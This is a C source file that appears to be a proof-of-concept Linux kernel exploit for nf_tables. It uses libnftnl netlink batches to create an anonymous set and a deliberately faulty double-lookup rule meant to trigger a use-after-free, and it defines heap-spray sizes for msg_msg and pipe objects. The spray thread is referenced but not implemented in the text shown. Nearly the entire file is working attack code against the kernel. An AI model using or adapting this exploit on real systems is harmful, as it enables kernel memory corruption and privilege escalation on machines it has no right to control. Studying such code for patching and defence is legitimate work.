#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <assert.h>
#include <netinet/in.h>
#include <stdint.h>
#include <syscall.h>
#include <mqueue.h>
#include <linux/io_uring.h>
#include <linux/keyctl.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define TARGET_SET_SIZE 0x180 // for kmalloc-cg-512 slab
#define NORMAL_SET_SIZE 0x158
#define LEAK_MSG_MSG_SIZE 0x200
#define LEAK_MSG_MSG_SPRAY_CNT 0x400
#define BARRIOR_MSG_MSG_SPRAY_CNT 0x1000
#define DELAY_SET_ELEM_CNT (0x300 * 0x800)
#define PIPE_SPRAY_CNT 0x800

int flag = 0;

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];
char mnl_batch_buffer2[2 * mnl_batch_limit];
char log_prefix[0x100];

struct msgp {
  long mtype;
  char mtext[1];
};

uint32_t family = NFPROTO_INET;
char *exploit_table_name = "exploit_table";
char *exploit_chain_name = "OUTPUT";

static void create_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char * table_name)
{
  struct nftnl_table *table = nftnl_table_alloc();
  if (table == NULL) {
    errx(1, "Cannot into nftnl_table_alloc()");
  }

  nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
  nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

  struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWTABLE,
      family,
      NLM_F_CREATE | NLM_F_ACK,
      seq
      );
  nftnl_table_nlmsg_build_payload(nlh, table);
  mnl_nlmsg_batch_next(batch);

  nftnl_table_free(table);
}

static void create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *set_name, uint32_t set_id, uint32_t set_flags,
    uint32_t set_key_len, uint32_t set_desc_size,
    void *set_userdata, uint32_t set_userdata_len)
{
  struct nftnl_set *set = nftnl_set_alloc();
  if (set == NULL) {
    errx(1, "Cannot into nftnl_set_alloc()");
  }

  nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
  nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
  nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
  nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
  nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
  nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
  if (set_desc_size != 0) {
    nftnl_set_set_u32(set, NFTNL_SET_DESC_SIZE, set_desc_size);
  }
  if (set_userdata != NULL) {
    nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
  }

  struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWSET,
      family,
      NLM_F_CREATE | NLM_F_ACK,
      seq
      );
  nftnl_set_nlmsg_build_payload(nlh, set);
  mnl_nlmsg_batch_next(batch);

  nftnl_set_free(set);
}


static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name)
{
  struct nftnl_chain *chain = nftnl_chain_alloc();
  if (chain == NULL) {
    errx(1, "Cannot into nftnl_chain_alloc()");
  }

  nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
  nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
  nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

  struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWCHAIN,
      family,
      NLM_F_CREATE | NLM_F_ACK,
      seq
      );
  nftnl_chain_nlmsg_build_payload(nlh, chain);
  mnl_nlmsg_batch_next(batch);

  nftnl_chain_free(chain);
}

static void create_lookup_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name, char *set_name, int set_id)
{
  struct nftnl_rule *rule = nftnl_rule_alloc();
  if (rule == NULL) {
    errx(1, "Cannot into nftnl_rule_alloc()");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  struct nftnl_expr *lookup = nftnl_expr_alloc("lookup");
  if (lookup == NULL) {
    errx(1, "Cannot into nftnl_expr_alloc()");
  }

  nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
  nftnl_expr_set_str(lookup, NFTNL_EXPR_LOOKUP_SET, set_name);
  nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
  nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_FLAGS, 0);

  nftnl_rule_add_expr(rule, lookup);

  struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWRULE,
      family,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
      seq
      );
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);
}

static void create_faulty_lookup_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char * table_name, char *chain_name, char *set_name, int set_id)
{
  struct nftnl_expr *lookup1, *lookup2;
  struct nftnl_rule *rule;

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    errx(1, "Cannot into nftnl_rule_alloc()");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  lookup1 = nftnl_expr_alloc("lookup");
  if (lookup1 == NULL) {
    errx(1, "Cannot into nftnl_expr_alloc()");
  }

  // for release
  nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
  nftnl_expr_set_str(lookup1, NFTNL_EXPR_LOOKUP_SET, set_name);
  nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
  nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_FLAGS, 0);

  nftnl_rule_add_expr(rule, lookup1);
  
  lookup2 = nftnl_expr_alloc("lookup");
  if (lookup2 == NULL) {
    errx(1, "Cannot into nftnl_expr_alloc()");
  }

  // for fault
  nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SREG, 0);
  nftnl_expr_set_str(lookup2, NFTNL_EXPR_LOOKUP_SET, set_name);
  nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
  nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_FLAGS, 0);

  nftnl_rule_add_expr(rule, lookup2);

  struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch),
      NFT_MSG_NEWRULE,
      family,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
      seq
      );
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);
}

static void prepare_nftables(struct mnl_socket *nl)
{
  uint32_t portid, seq, table_seq;
  int ret;

  seq = time(NULL);

  struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  table_seq = seq;
  mnl_nlmsg_batch_next(batch);

  // table for exploit
  create_table(batch, seq++, exploit_table_name);
  create_chain(batch, seq++, exploit_table_name, exploit_chain_name);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  portid = mnl_socket_get_portid(nl);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
        mnl_nlmsg_batch_size(batch)) < 0) {
    err(1, "Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);

  while (table_seq + 1 != seq) {
    ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
    if (ret == -1) {
      err(1, "Cannot into mnl_socket_recvfrom()");
    }
    ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
    if (ret == -1) {
      err(1, "Cannot into mnl_cb_run()");
    }
    table_seq++;
  }
}

static void trigger_uaf(struct mnl_socket *nl)
{
  uint32_t portid, seq, table_seq;
  struct mnl_nlmsg_batch *batch;
  char exploit_set_name[0x100];
  char udata_buf[TARGET_SET_SIZE];

  // first batch : register anon set
  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  
  table_seq = seq;
  mnl_nlmsg_batch_next(batch);
  
  memset(exploit_set_name, 'A', sizeof(exploit_set_name));
  memset(udata_buf, 0, TARGET_SET_SIZE);
  exploit_set_name[sizeof(exploit_set_name) - 1] = '\x00';
  
  create_set(batch, seq++, exploit_table_name, "a", 0x13100, NFT_SET_ANONYMOUS, 1, 0, udata_buf, TARGET_SET_SIZE - NORMAL_SET_SIZE);
  create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
  create_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);
  
  portid = mnl_socket_get_portid(nl);
  
  // start spray thread
  printf("[*] first batch will start with spray\n");
  flag = 1;
  sleep(1);
  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
        mnl_nlmsg_batch_size(batch)) < 0) {
    err(1, "Cannot into mnl_socket_sendto()");
  }
  
}

int main(int argc, char ** argv)
{
  struct mnl_socket *nl;
  
  nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL) {
    err(1, "Cannot into mnl_socket_open()");
  }
  
  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
    err(1, "Cannot into mnl_socket_bind()");
  }

  // setup table and chains
  printf("[*] prepare table and chain...\n");
  prepare_nftables(nl);
  
  printf("[*] now trigger UAF...\n");
  trigger_uaf(nl);
}
